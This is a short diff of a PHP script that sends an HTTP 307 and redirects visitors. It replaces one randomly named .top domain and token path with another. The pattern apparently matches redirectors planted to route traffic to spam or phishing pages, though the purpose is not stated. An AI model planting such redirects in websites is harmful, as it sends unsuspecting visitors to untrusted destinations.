@@ -3,6 +3,6 @@
 http_response_code(307);
 
 // Выполняем редирект на нужный URL
-header('Location: https://aahyperpath.top/4zty7T');
+header('Location: https://serversiquorixa.top/sDy81P');
 exit();
 ?>
